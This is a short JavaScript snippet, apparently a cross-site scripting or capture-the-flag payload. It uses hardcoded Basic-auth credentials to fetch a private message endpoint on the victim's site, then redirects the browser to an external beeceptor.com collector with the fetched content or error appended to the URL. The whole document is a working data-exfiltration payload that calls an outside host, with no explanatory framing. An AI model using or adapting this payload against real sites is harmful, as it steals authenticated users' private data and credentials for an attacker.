(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/message/214646f5-1e6f-4049-a1e9-c0d98bcadda6', {headers, redirect: 'manual'}).then(res => res.text()).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + encodeURIComponent(res).slice(0, 10000));
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
  });
})()
